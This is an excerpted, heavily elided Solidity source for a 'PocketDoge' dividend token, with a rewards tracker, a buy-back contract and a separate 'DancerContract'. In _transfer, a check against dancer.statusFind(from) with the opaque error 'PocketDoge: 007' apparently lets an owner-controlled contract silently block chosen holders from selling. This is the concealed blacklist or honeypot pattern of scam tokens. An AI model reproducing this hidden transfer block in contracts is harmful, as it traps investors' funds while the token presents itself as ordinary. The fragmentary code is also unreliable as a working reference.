...
contract PocketDogeBuyBack is Ownable {
    using SafeMath for uint256;
...
contract DancerContract is Ownable {
    ...
    address public marketingWallet = 0xcF59e8250336Ee1C43b2d129774bc800BFC7F141;
...
contract PocketDoge is ERC20, Ownable {
    ...
    PocketDogeRewardsTracker public rewardsTracker;
    
    PocketDogeBuyBack public buyBackContract;
    ...
    address payable public marketingWallet = payable(0xcF59e8250336Ee1C43b2d129774bc800BFC7F141);
    ...
    constructor() ERC20("PocketDoge", "PocketDoge") {
        totalFees = rewardsFee.add(liquidityFee);

    	liquidityWallet = owner();

        rewardsTracker = new PocketDogeRewardsTracker();
        
        buyBackContract = new PocketDogeBuyBack();
    ...
    function _transfer(
        ...
        require(!dancer.statusFind(from), "PocketDoge: 007");
        
        if(!tradingIsEnabled) {
            require(canTransferBeforeTradingIsEnabled[from], "PocketDoge: This account cannot send tokens until trading is enabled");
        }
        ...
        rewardsTracker.updatePocketDogeBalance(payable(from), balanceOf(from));
        rewardsTracker.updatePocketDogeBalance(payable(to), balanceOf(to));
...
/// @author Roger Wu (https://github.com/roger-wu) - forked specific functions for PocketDoge Token
...
contract PocketDogeRewardsTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    mapping (address => uint256) public PocketDogeBalance;
    ...
    constructor() DividendPayingToken("PocketDogeRewardsTracker", "PocketDogeRewardsTracker") {
    ...
    function _transfer(address, address, uint256) internal pure override {
        require(false, "PocketDogeRewardsTracker: No transfers allowed");
    }

    function withdrawDividend() public pure override {
        require(false, "PocketDogeRewardsTracker: Use the 'claim' function on the main PocketDoge contract.");
    }
    ...
    function updatePocketDogeBalance(address payable holder, uint256 shares) external onlyOwner {
        PocketDogeBalance[holder] = shares;
    }
    ...
    function setBalance(address payable account) public onlyOwner {
    	...
    	uint256 newBalanceWithOffset = PocketDogeBalance[account].add(offset[account]);
